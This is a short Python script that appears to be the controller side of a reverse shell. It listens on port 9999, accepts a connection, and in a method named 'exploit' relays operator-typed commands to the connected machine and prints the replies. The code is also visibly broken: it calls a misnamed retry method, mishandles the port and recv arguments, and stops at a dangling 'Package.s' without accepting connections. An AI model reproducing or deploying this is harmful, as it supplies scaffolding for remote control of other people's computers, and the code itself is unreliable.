import socket
import sys


class Connect:
    # Create a Socket ( connect two computers)
    def __init__(self, Port=9999, Host=""):
        self.s = socket.socket()
        self.port = Port
        self.host = Host

    def createSocket(self):
        try:
            self.s = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))

    # Binding the socket and listening for connections
    def bindSocket(self):
        try:
            print("Binding the Port: " + str(self.port))

            self.s.bind((self.host, self.port))
            self.s.listen(5)
        except socket.error as msg:
            print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
            self.bind_socket()

    def acceptSocket(self):
        connection, Address = self.s.accept()
        print("Congrats, Connected To Host => |" + Address[0] + "| Port => |" + Address[1] + "|")
        self.exploit(connection)
        self.s.close()

    def exploit(self, connection):
        while True:
            cmd = input()
            if cmd == "quit":
                connection.close()
                self.s.close()
                sys.exit()
            if len(str.encode(cmd)) > 0:
                connection.send(str.encode(cmd))
                response = str(connection.recv(1024, "utf-8"))
                print(response)


if __name__ == '__main__':
    Package = Connect()
    Package.createSocket()
    Package.bindSocket()
    Package.s
